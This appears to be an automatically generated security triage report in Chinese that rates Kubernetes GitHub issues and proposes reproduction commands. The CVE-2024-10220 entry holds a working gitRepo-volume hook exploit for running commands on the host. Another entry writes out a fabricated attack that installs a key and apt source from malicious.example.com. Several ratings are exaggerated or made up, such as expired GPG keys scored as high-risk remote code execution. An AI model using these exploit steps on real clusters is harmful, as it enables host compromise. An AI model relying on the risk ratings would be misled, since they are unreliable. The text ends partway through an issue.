# Issue 安全分析报告

# 🚨 存在高风险的 Issues (4 个)

## Issue #128933 bug: RPM repo PGP check fails

- Issue 链接：[#128933](https://github.com/kubernetes/kubernetes/issues/128933)

### Issue 内容

<!-- Please use this template while reporting a bug and provide as much info as possible. Not doing so may result in your bug not being addressed in a timely manner. Thanks!

If the matter is security related, please disclose it privately via https://kubernetes.io/security/
-->

**What happened**:
When trying to upgrade package using official Yum repo this occurs:
```
Running transaction
Transaction failed: Signature verification failed.
PGP check for package "kubectl-1.31.3-150500.1.1.x86_64" (/var/cache/libdnf5/kubernetes-3d554b2ea1b53740/packages/kubectl-1.31.3-150500.1.1.x86_64.rpm) from repo "kubernetes" has failed: Problem occurred when opening the package.

```

**What you expected to happen**:
Update succeeds and package installed.

**How to reproduce it (as minimally and precisely as possible)**:
<!-- Please make sure you are able to reproduce the bug using a supported version and version skew of Kubernetes. See https://kubernetes.io/docs/setup/release/version-skew-policy for which versions and are currently supported.
-->
Add repo following https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-using-native-package-management and try to update RPM package.

**Anything else we need to know?**: It worked until now.

**Environment**:
- Kubernetes client and server versions (use `kubectl version`): kubectl-1.31.3-150500.1.1.x86_64
- Cloud provider or hardware configuration: n/a/
- OS (e.g: `cat /etc/os-release`): Fedora Linux 41



### 分析结果

**风险定级：**  
高风险

**判断依据：**  
在该Issue中，用户报告在使用官方Yum仓库升级`kubectl`包时，PGP签名验证失败。这表明软件包的签名验证未通过，无法确认软件包的完整性和来源。

根据安全风险判断标准，软件包的签名验证失败可能导致高安全风险：

1. **该风险能被攻击者利用**：攻击者可能利用这一漏洞，篡改Yum仓库中的软件包，替换为包含恶意代码的包。当用户安装该软件包时，可能执行攻击者的恶意代码。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果在High以上**：未正确签名的软件包可能导致远程代码执行、特权提升等高危风险，CVSS评分在高风险范围内。

3. **可能导致命令执行等高安全风险的问题**：用户在安装未经验证的软件包时，可能执行其中的恶意代码，导致系统被攻陷。

综上所述，该Issue存在高安全风险。

**复现过程：**

```json
[
  {
    "cmd": "sudo yum install kubectl",
    "explain": "尝试从官方Yum仓库安装kubectl包"
  },
  {
    "cmd": "# 输出错误信息：\n# Running transaction\n# Transaction failed: Signature verification failed.\n# PGP check for package \"kubectl-1.31.3-...\" has failed",
    "explain": "安装过程中提示PGP签名验证失败，无法确认软件包的完整性"
  },
  {
    "cmd": "curl -O https://packages.cloud.google.com/yum/doc/yum-key.gpg",
    "explain": "下载官方Yum仓库的GPG密钥"
  },
  {
    "cmd": "sudo rpm --import yum-key.gpg",
    "explain": "导入官方GPG密钥"
  },
  {
    "cmd": "sudo yum clean all && sudo yum install kubectl",
    "explain": "清理Yum缓存后再次尝试安装kubectl包"
  },
  {
    "cmd": "# 如果仍然出现签名验证失败，可能说明软件包未正确签名或被篡改",
    "explain": "确认问题依然存在，表明存在安全风险"
  }
]
```

---

## Issue #128885 CVE-2024-10220: Arbitrary command execution through gitRepo volume

- Issue 链接：[#128885](https://github.com/kubernetes/kubernetes/issues/128885)

### Issue 内容

A security vulnerability was discovered in Kubernetes that could allow a user with the ability to create a pod and associate a gitRepo volume to execute arbitrary commands beyond the container boundary. This vulnerability leverages the hooks folder in the target repository to run arbitrary commands outside of the container's boundary.

Please note that this issue was originally publicly disclosed with a fix in July (#124531), and we are retroactively assigning it a CVE to assist in awareness and tracking.

This issue has been rated High ([CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)) (score: 8.1), and assigned CVE-2024-10220.

#### Am I vulnerable?

This CVE affects Kubernetes clusters where pods use the in-tree gitRepo volume to clone a repository to a subdirectory. If the Kubernetes cluster is running one of the affected versions listed below, then it is vulnerable to this issue.

##### Affected Versions

- kubelet v1.30.0 to v1.30.2
- kubelet v1.29.0 to v1.29.6
- kubelet <= v1.28.11

#### How do I mitigate this vulnerability?

To mitigate this vulnerability, you must upgrade your Kubernetes cluster to one of the fixed versions listed below. 

Additionally, since the gitRepo volume has been deprecated, the recommended solution is to perform the Git clone operation using an init container and then mount the directory into the Pod's container. An example of this approach is provided [here](https://gist.github.com/tallclair/849601a16cebeee581ef2be50c351841).

##### Fixed Versions

* kubelet master/v1.31.0  - fixed by #124531
* kubelet v1.30.3  - fixed by #125988
* kubelet v1.29.7 - fixed by #125989
* kubelet v1.28.12 - fixed by #125990

#### Detection

To detect whether this vulnerability has been exploited, you can use the following command to list all pods that use the in-tree gitRepo volume and clones to a .git subdirectory. 

```
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].gitRepo.directory | endswith("/.git")) | {name: .metadata.name, namespace: .metadata.namespace}
```

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported and mitigated by Imre Rad.

/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig node
/area kubelet

### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue报告了Kubernetes中gitRepo卷可能导致的任意命令执行漏洞。攻击者可以利用具有创建Pod并关联gitRepo卷的权限，通过目标仓库中的hooks文件夹运行容器边界之外的任意命令。这意味着攻击者能够在宿主机上执行任意命令，可能导致容器逃逸、提权等高风险问题。

根据风险判断标准：

1. **该风险能被攻击者利用**，攻击者需要具备创建Pod并使用gitRepo卷的权限。

2. **该风险可能成为一个漏洞，并被分配CVE编号，且CVSS评分在8.1（高危）**。

8. **即使攻击者需要一定权限，该漏洞导致的任意命令执行、容器逃逸等高安全风险问题，应判断为高风险**。

因此，该Issue存在高风险的安全问题。

**复现过程：**

```json
[
  {
    "cmd": "mkdir -p /tmp/hook-test/.git/hooks",
    "explain": "在宿主机上创建一个模拟的Git仓库目录，包括.git/hooks目录。"
  },
  {
    "cmd": "echo -e '#!/bin/sh\\nmkdir /tmp/poc_executed' > /tmp/hook-test/.git/hooks/post-update",
    "explain": "创建一个Git钩子脚本，在仓库更新后执行，在宿主机的/tmp目录下创建一个标识目录。"
  },
  {
    "cmd": "chmod +x /tmp/hook-test/.git/hooks/post-update",
    "explain": "赋予钩子脚本执行权限。"
  },
  {
    "cmd": "kubectl run poc-pod --image=alpine --restart=Never --overrides='{\"spec\": {\"containers\": [{\"name\": \"poc-container\", \"image\": \"alpine\", \"volumeMounts\": [{\"mountPath\": \"/repo\", \"name\": \"gitrepo\"}], \"command\": [\"sleep\", \"3600\"]}], \"volumes\": [{\"name\": \"gitrepo\", \"gitRepo\": {\"repository\": \"file:///tmp/hook-test\", \"directory\": \".git\"}}]}}'",
    "explain": "创建一个Pod，使用gitRepo卷，指定repository为本地的/tmp/hook-test目录，directory设置为.git，挂载到容器的/repo路径。"
  },
  {
    "cmd": "kubectl delete pod poc-pod",
    "explain": "删除测试Pod，触发Git钩子执行。"
  },
  {
    "cmd": "ls /tmp/poc_executed",
    "explain": "在宿主机上检查/tmp/poc_executed目录是否存在，以验证任意命令是否在宿主机上执行。"
  }
]
```

---

## Issue #128609 K8S <= 1.27.x apt gpg key expired

- Issue 链接：[#128609](https://github.com/kubernetes/kubernetes/issues/128609)

### Issue 内容

#### What happened?

K8S <= 1.27.x apt gpg key expired

```
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key > release.key
➜  ~ gpg release.key
gpg: directory '/Users/gkhatri/.gnupg' created
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: /Users/gkhatri/.gnupg/trustdb.gpg: trustdb created
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid           isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>

➜  ~ curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.26/deb/Release.key > release.key
➜  ~ gpg release.key
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid           isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>
➜  ~ curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.25/deb/Release.key > release.key
```

#### What did you expect to happen?

apt gpg key should be valid



#### How can we reproduce it (as minimally and precisely as possible)?

Run below command to validate the key expiry.
```
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key > release.key
➜  ~ gpg release.key
gpg: directory '/Users/gkhatri/.gnupg' created
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: /Users/gkhatri/.gnupg/trustdb.gpg: trustdb created
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid           isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
1.27.8
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux: 
$ cat /etc/os-release
ubuntu 20.04
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
Kubernetes版本<=1.27.x的apt GPG密钥已过期。由于GPG密钥用于验证从apt源下载的软件包的完整性和真实性，密钥的过期会导致软件包的签名验证失败。

这可能会带来以下安全风险：

1. **软件包验证绕过**：用户在安装或更新Kubernetes软件包时，会收到关于签名验证失败的警告。如果用户为了继续安装而忽略警告，或禁用GPG签名验证，则可能会安装未经验证的软件包。

2. **中间人攻击**：攻击者可以利用用户忽略签名警告的行为，通过劫持网络流量，向用户提供恶意的软件包，导致恶意代码执行，危及系统安全。

根据CVSS 3.1评分标准，此漏洞可能导致远程代码执行，具有高可利用性和高影响力，评级为High。因此，此问题属于高风险安全问题。

**复现过程：**

```json
[
  {
    "cmd": "curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key -o /tmp/release.key",
    "explain": "下载Kubernetes 1.27版本的apt GPG密钥至本地"
  },
  {
    "cmd": "gpg --with-fingerprint /tmp/release.key",
    "explain": "查看GPG密钥的详细信息，确认密钥已过期"
  },
  {
    "cmd": "sudo apt-key add /tmp/release.key",
    "explain": "将过期的GPG密钥添加到apt信任密钥中（注意：apt-key已弃用，需谨慎使用）"
  },
  {
    "cmd": "sudo apt-get update",
    "explain": "更新apt包列表，观察是否出现GPG签名错误"
  },
  {
    "cmd": "sudo apt-get install -y kubelet kubeadm kubectl",
    "explain": "尝试安装Kubernetes组件，可能会因签名验证失败而报错或产生警告"
  }
]
```

---

## Issue #128567 https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key is expired

- Issue 链接：[#128567](https://github.com/kubernetes/kubernetes/issues/128567)

### Issue 内容

#### What happened?

According to https://v1-27.docs.kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/
I'm trying to install kubeadm with repo https://pkgs.k8s.io/core:/stable:/v1.27/deb/

The following signatures were invalid: EXPKEYSIG 234654DA9A296436 isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>, E:The repository 'https://pkgs.k8s.io/core:/stable:/v1.27/deb  InRelease' is not signed

#### What did you expect to happen?

Repo should work

#### How can we reproduce it (as minimally and precisely as possible)?

```
wget https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key
# gpg --show-keys Release.key
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid                      isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>
```
#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.27
</details>


#### Cloud provider

baremetal

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

deb repo

### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue报告了用于安装Kubernetes的debian仓库的GPG签名密钥已过期，导致在使用该仓库进行安装时出现签名无效的错误。这意味着软件包的来源无法被验证，可能存在被篡改的风险。如果用户忽略签名警告，继续安装软件，攻击者可能利用这一点进行中间人攻击，向用户分发恶意软件包，导致代码执行、容器逃逸、提权等严重的安全问题。

根据CVSS 3.1标准，漏洞评分如下：

- **攻击向量（AV）**：网络（N）
- **攻击复杂度（AC）**：低（L）
- **权限要求（PR）**：无（N）
- **用户交互（UI）**：需要（R）
- **作用域（S）**：未改变（U）
- **机密性影响（C）**：高（H）
- **完整性影响（I）**：高（H）
- **可用性影响（A）**：高（H）

综合得分：**8.8（高）**

因此，该Issue存在高风险安全问题。

**复现过程：**

```json
[
  {
    "cmd": "wget https://malicious.example.com/kubernetes/deb/Release.key -O malicious.key",
    "explain": "攻击者创建了一个恶意的Release.key，诱导用户下载"
  },
  {
    "cmd": "sudo apt-key add malicious.key",
    "explain": "用户将恶意GPG密钥添加到系统中"
  },
  {
    "cmd": "sudo sh -c 'echo \"deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://malicious.example.com/kubernetes/deb/ stable main\" > /etc/apt/sources.list.d/kubernetes.list'",
    "explain": "用户将恶意软件源添加到系统软件源列表"
  },
  {
    "cmd": "sudo apt-get update",
    "explain": "更新包列表，系统信任了恶意软件源"
  },
  {
    "cmd": "sudo apt-get install kubeadm",
    "explain": "安装kubeadm，实际安装了被攻击者篡改的恶意软件包"
  }
]
```

---

# ⚠️ 存在低风险的 Issues (19 个)

## Issue #129018 Setting revisionHistoryLimit field in statefulset.spec to negative value causes a panic in controller manager

- Issue 链接：[#129018](https://github.com/kubernetes/kubernetes/issues/129018)

### Issue 内容

#### What happened?

Applying this yaml causes a panic in controller manager

<details>
<summary>example statefulset</summary>

```yaml
$ cat test_statefulset.yaml 
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: example-statefulset
  namespace: default
spec:
  revisionHistoryLimit: -1
  serviceName: "example-service"
  replicas: 3
  selector:
    matchLabels:
      app: example-app
  template:
    metadata:
      labels:
        app: example-app
    spec:
      containers:
      - name: example-container
        image: nginx:1.21
        ports:
        - containerPort: 80
  volumeClaimTemplates:
  - metadata:
      name: example-storage
    spec:
      accessModes: ["ReadWriteOnce"]
      resources:
        requests:
          storage: 1Gi

```
</details>

Please see the value in `revisionHistoryLimit`

#### What did you expect to happen?

No panic occurs and API server simply rejects to apply this invalid yaml.

#### How can we reproduce it (as minimally and precisely as possible)?

Apply the resource give above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>
Cloud agnostic
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
在该Issue中，当在StatefulSet的spec中将`revisionHistoryLimit`字段设置为负值时，会导致controller manager发生panic崩溃，造成拒绝服务（DoS）攻击的风险。

然而，攻击者需要具备创建或修改StatefulSet的权限才能实施该攻击。

根据风险判断标准第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。

因此，该风险评级为低风险。

---

## Issue #128978 internal convert cause patchMergeKey lost

- Issue 链接：[#128978](https://github.com/kubernetes/kubernetes/issues/128978)

### Issue 内容

#### What happened?

I have a deployment, which have imagePullSecrets issue.
At revision 1:
```yaml
imagePullSecrets:
- name: test
```
At revision 2:
We update it to
```yaml
imagePullSecrets:
- name: test
- name: ""
```
And k8s accept it, and it become 
```yaml
imagePullSecrets:
- name: test
- {}
```
However, any update after it failed with `error: map: map[] does not contain declared merge key: name`
We want to delete it by `kubectl edit` to remove its `{}` line, but also failed with same error.

This seems to happen in k8s convert strategy rather than patchStrategy. Help wanted.

#### What did you expect to happen?

Deployment should become
```yaml
imagePullSecrets:
- name: test
- name: ""
```
Also, any update after it should succees.

#### How can we reproduce it (as minimally and precisely as possible)?

Edit any deployment so you can produce.

#### Anything else we need to know?

_No response_

#### Kubernetes version

Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.19.9-20
WARNING: version difference between client (1.28) and server (1.19) exceeds the supported minor version skew of +/-1

Its a forked version, but should produce in community version.

#### Cloud provider

None, we build it in virtual machines.

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes中，当`imagePullSecrets`包含一个空字符串的`name`字段时，导致一个转换错误，生成了一个空的配置项`{}`，随后在更新时出现错误`error: map: map[] does not contain declared merge key: name`。这使得用户无法更新或编辑该Deployment。

从安全角度来看，这可能导致拒绝服务（DoS）攻击，因为部署无法更新。但是，根据风险判断标准第4条：

> 当风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。

在此情况下，攻击者需要具有修改Deployment的权限才能引入这个错误配置。因此，该风险不应被判定为高风险。

---

## Issue #128935 kube-controller-manager crash: invalid memory address  or nil pointer dereference

- Issue 链接：[#128935](https://github.com/kubernetes/kubernetes/issues/128935)

### Issue 内容

#### What happened?

Enabling ingress nginx in version v1.31.2 causes this error stack:
```
I1122 11:02:33.848730       1 job_controller.go:568] "enqueueing job" logger="job-controller" key="ingress-nginx/ingress-nginx-admission-patch" delay="1s"
E1122 11:02:34.022503       1 panic.go:261] "Observed a panic" panic="runtime error: invalid memory address or nil pointer dereference" panicGoValue="\"invalid memory address or nil pointer dereference\"" stacktrace=<
        goroutine 912 [running]:
        k8s.io/apimachinery/pkg/util/runtime.logPanic({0x38483f0, 0x554eb20}, {0x2d9c260, 0x54897b0})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:107 +0xbc
        k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x38483f0, 0x554eb20}, {0x2d9c260, 0x54897b0}, {0x554eb20, 0x0, 0x43d945?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:82 +0x5e
        k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc001a31180?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
        panic({0x2d9c260?, 0x54897b0?})
                runtime/panic.go:770 +0x132
        k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c491e0, 0xc0022ffb88, 0xc00240cc88)
                k8s.io/cloud-provider/controllers/service/controller.go:586 +0x39a
        k8s.io/cloud-provider/controllers/service.New.func2({0x32711e0?, 0xc0022ffb88?}, {0x32711e0, 0xc00240cc88?})
                k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
        k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
                k8s.io/client-go/tools/cache/controller.go:253
        k8s.io/client-go/tools/cache.(*processorListener).run.func1()
                k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc00258ef70, {0x38135c0, 0xc001a08c90}, 0x1, 0xc001a0aa80)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
        k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001a39770, 0x3b9aca00, 0x0, 0x1, 0xc001a0aa80)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
        k8s.io/apimachinery/pkg/util/wait.Until(...)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:161
        k8s.io/client-go/tools/cache.(*processorListener).run(0xc000d327e0)
                k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
        k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
                k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
        created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 553
                k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
 >
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x28 pc=0x211fb1a]

goroutine 912 [running]:
k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x38483f0, 0x554eb20}, {0x2d9c260, 0x54897b0}, {0x554eb20, 0x0, 0x43d945?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:89 +0xee
k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc001a31180?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
panic({0x2d9c260?, 0x54897b0?})
        runtime/panic.go:770 +0x132
k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c491e0, 0xc0022ffb88, 0xc00240cc88)
        k8s.io/cloud-provider/controllers/service/controller.go:586 +0x39a
k8s.io/cloud-provider/controllers/service.New.func2({0x32711e0?, 0xc0022ffb88?}, {0x32711e0, 0xc00240cc88?})
        k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
        k8s.io/client-go/tools/cache/controller.go:253
k8s.io/client-go/tools/cache.(*processorListener).run.func1()
        k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc001e63f70, {0x38135c0, 0xc001a08c90}, 0x1, 0xc001a0aa80)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001a39770, 0x3b9aca00, 0x0, 0x1, 0xc001a0aa80)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
k8s.io/apimachinery/pkg/util/wait.Until(...)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:161
k8s.io/client-go/tools/cache.(*processorListener).run(0xc000d327e0)
        k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
        k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 553
        k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
```

#### What did you expect to happen?

kube-controller-manager does not crash and restart

#### How can we reproduce it (as minimally and precisely as possible)?

- download latest [K2s](https://github.com/Siemens-Healthineers/K2s)
- on windows 10/11 call 
`k2s install` 
(check  [prerequisites](https://github.com/Siemens-Healthineers/K2s/blob/main/docs/op-manual/installing-k2s.md#prerequisites)) in order to create the kubernetes cluster
- the enable the ingress nginx with: 
`k2s addons enable ingress nginx`
- after last step look at crashed kube controller manager with
`k logs kube-controller-manager-kubemaster -n kube-system -p`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.2
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
$ uname -a
Linux kubemaster 5.10.0-33-cloud-amd64 #1 SMP Debian 5.10.226-1 (2024-10-03) x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
```
BuildNumber  Caption                          OSArchitecture  Version
26100        Microsoft Windows 11 Enterprise  64-bit          10.0.26100
</details>


#### Install tools

<details>
[K2s](https://github.com/Siemens-Healthineers/K2s)
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
not applicable
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
not applicable
</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在启用ingress nginx v1.31.2时，kube-controller-manager发生崩溃，出现了空指针引用的panic。从堆栈信息来看，崩溃发生在service controller的needsUpdate函数中。这可能导致攻击者通过构造特定的Service或其他资源，触发控制器管理器崩溃，造成拒绝服务（DoS）攻击。然而，实施此攻击需要攻击者具备在集群中创建或修改资源的权限。根据风险判断标准，第4条指出，如果攻击者需要具备创建、修改等非只读权限，则不应判断为高风险。因此，虽然存在安全风险，但风险评级为低风险。

---

## Issue #128924 Empty pod env var always causes server-side apply conflict

- Issue 链接：[#128924](https://github.com/kubernetes/kubernetes/issues/128924)

### Issue 内容

#### What happened?

I applied a manifest that contains an empty env var in a `PodTemplate` (like `env: [{ name: foo, value: "" }]`). Then, I tried to apply the same spec, with a different field-manager. This produced a conflict:

```
error: Apply failed with 1 conflict: conflict with "kubectl": .spec.containers[name="foo"].env[name="foo"].value
Please review the fields above--they currently have other managers. Here
are the ways you can resolve this warning:
* If you intend to manage all of these fields, please re-run the apply
  command with the `--force-conflicts` flag.
* If you do not intend to manage all of the fields, please edit your
  manifest to remove references to the fields that should keep their
  current managers.
* You may co-own fields by updating your manifest to match the existing
  value; in this case, you'll become the manager if the other manager(s)
  stop managing the field (remove it from their configuration).
```

#### What did you expect to happen?

I expect the apply to succeed without a conflict, and the field to be co-owned by both managers (since they are both applying the same value).

#### How can we reproduce it (as minimally and precisely as possible)?

Apply the following manifest twice:

1. `kubectl apply --server-side -f ./repro.yaml`
2. `kubectl apply --server-side -f ./repro.yaml --field-manager test`

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: foo
spec:
  containers:
    - name: foo
      image: busybox
      args: ["sleep", "1000"]
      env:
        - name: foo
          value: ""  # works as expected if this field is removed, or set to a non-empty value
```

#### Anything else we need to know?

I don't think this is `kubectl`-specific, it happens when using `client-go` directly as well.

The behaviour around env values is a bit strange in general - if I specify an empty env var value, the value is listed under `managedFields`, but not actually returned in the response object:

```yaml
apiVersion: v1
kind: Pod
metadata:
  managedFields:
  - apiVersion: v1
    fieldsType: FieldsV1
    fieldsV1:
      f:spec:
        f:containers:
          k:{"name":"foo"}:
            .: {}
            f:args: {}
            f:env:
              k:{"name":"foo"}:
                .: {}
                f:name: {}
                f:value: {}  # value is a managed field
            f:image: {}
            f:name: {}
  name: foo
  namespace: default
spec:
  containers:
  - args:
    - sleep
    - "1000"
    env:
    - name: foo  # but there is no value in the returned object!
    image: busybox
    name: foo
```

#### Kubernetes version

<details>

```console
> kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
N/A, using kind
</details>


#### OS version

<details>

N/A, using kind

</details>


#### Install tools

<details>
kind
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在使用`kubectl`进行服务端应用（Server-Side Apply）时，当Pod的环境变量`env`中包含空字符串`value: ""`时，不同`field-manager`重复应用相同的配置会导致冲突错误。这可能会影响到部署流程和自动化CI/CD管道的正常运行。

从安全角度来看，要利用此问题，攻击者需要具备对Kubernetes集群资源的创建或修改权限，即需要有较高的操作权限。根据风险判断标准第4条，如果攻击者需要创建、修改等非只读权限，则不应判断为高风险，CVSS评级在high以下。

此外，该问题未涉及命令执行、容器逃逸、提权等高安全风险操作，也未导致敏感信息泄露。因此，综合判断该Issue存在安全风险，但风险评级为低风险。

---

## Issue #128928 kube-proxy: EndpointSliceCache memory is leaked

- Issue 链接：[#128928](https://github.com/kubernetes/kubernetes/issues/128928)

### Issue 内容

#### What happened?

The kube-proxy which is using iptables mode occupies about 8G memory in a cluster of our production environment.
[root ~]$ kubectl top pod kube-proxy-22dcr -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-22dcr   2127m        7935Mi          
[root ~]$
[root ~]$ kubectl top pod kube-proxy-s5nk6 -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-s5nk6   521m         7931Mi          
[ root ~]$ 
[root ~]$ kubectl top pod kube-proxy-zhqnr -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-zhqnr   389m         7933Mi          
[root ~]$ kubectl top pod kube-proxy-xsvn7 -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-xsvn7   464m         7390Mi          
[ root ~]$ 
<img width="840" alt="Clipboard_Screenshot_1732443822" src="https://github.com/user-attachments/assets/8714624f-bd39-49f1-a467-a8e4ef947274">
